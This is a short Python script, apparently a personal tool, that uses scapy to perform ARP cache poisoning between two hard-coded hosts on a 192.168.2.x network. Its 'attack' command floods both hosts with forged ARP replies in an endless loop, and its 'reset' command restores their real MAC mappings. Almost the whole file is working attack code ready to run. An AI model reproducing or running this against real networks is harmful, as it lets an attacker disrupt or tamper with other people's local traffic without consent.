import sys

sys.path.append('/home/jonathan/.cache/pypoetry/virtualenvs/pt-vQ9_wA6r-py3.12/lib64/python3.12/site-packages/')
sys.path.append('/home/jonathan/.cache/pypoetry/virtualenvs/pt-vQ9_wA6r-py3.12/lib/python3.12/site-packages/')

import argparse
import scapy.all as scapy

ARP__IS_AT = 2

def restore_defaults(dest, source, iface):
    # getting the real MACs
    target_mac = get_mac(dest, iface)
    source_mac = get_mac(source, iface)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def get_mac(ip, iface):
    final_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    answer, _ = scapy.srp(final_packet, timeout=2, verbose=False, iface=iface, inter=0.1)
    mac = answer[0][1].hwsrc
    return mac


# we will send the packet to the target by pretending being the spoofed
def poison(target, spoofed, iface):
    mac = get_mac(target, iface)
    # generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op=ARP__IS_AT, hwdst=mac, pdst=target, psrc=spoofed, hwsrc="ff:ff:ff:ff:ff:ff")
    scapy.send(packet, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="Network tool with attack and reset commands.")
    
    subparsers = parser.add_subparsers(dest='command', required=True)

    # Subparser for the attack command
    attack_parser = subparsers.add_parser('attack', help='Perform an attack on the specified interface.')
    attack_parser.add_argument('interface', type=str, help='The network interface to use for the attack.')

    # Subparser for the reset command
    reset_parser = subparsers.add_parser('reset', help='Reset the specified interface.')
    reset_parser.add_argument('interface', type=str, help='The network interface to reset.')

    # Parse the arguments
    args = parser.parse_args()

    # Call the appropriate function based on the command
    if args.command == 'attack':
        try:
            while True:
                poison("192.168.2.1", "192.168.2.2", args.interface)
                poison("192.168.2.2", "192.168.2.1", args.interface)
        except KeyboardInterrupt:
            pass
    elif args.command == 'reset':
        restore_defaults("192.168.2.2", "192.168.2.1", args.interface)
        restore_defaults("192.168.2.1", "192.168.2.2", args.interface)

if __name__ == "__main__":
    main()

